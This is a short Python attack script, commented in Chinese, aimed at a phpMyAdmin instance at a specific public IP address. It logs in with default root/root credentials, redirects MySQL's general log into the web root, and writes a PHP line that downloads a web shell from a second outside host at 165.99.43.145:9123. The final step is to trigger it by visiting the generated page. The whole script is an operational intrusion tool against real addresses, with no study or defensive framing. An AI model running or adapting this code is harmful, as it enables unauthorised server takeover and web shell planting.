#!/usr/bin/env python3
"""方案3: general_log 写无$下载器 → copy() 拉取干净shell
81.70.245.25: 写 gen.php 下载器,触发执行,生成 ys.php
"""
import urllib.request, http.cookiejar, re, urllib.parse, time

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 1. 日志文件改到 gen.php (全新文件,避免旧坏代码)
print("1. 切日志文件:", "OK" if "error" not in sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/gen.php'").lower()[:500] else "FAIL")
# 2. 开日志
print("2. 开日志:", "OK" if "error" not in sql("SET GLOBAL general_log = 'ON'").lower()[:500] else "FAIL")
# 3. 写下载器 payload (无$字符! MySQL不会吃掉)
#    <?php copy("http://165.99.43.145:9123/ys.php","C:/phpStudy/WWW/ys.php");?>
payload = "SELECT '<?php copy(\"http://165.99.43.145:9123/ys.php\",\"C:/phpStudy/WWW/ys.php\");?>'"
print("3. 写payload:", "OK" if "error" not in sql(payload).lower()[:500] else "FAIL")
# 4. 关日志
print("4. 关日志:", "OK" if "error" not in sql("SET GLOBAL general_log = 'OFF'").lower()[:500] else "FAIL")
print("DONE - 现在访问 gen.php 触发 copy")
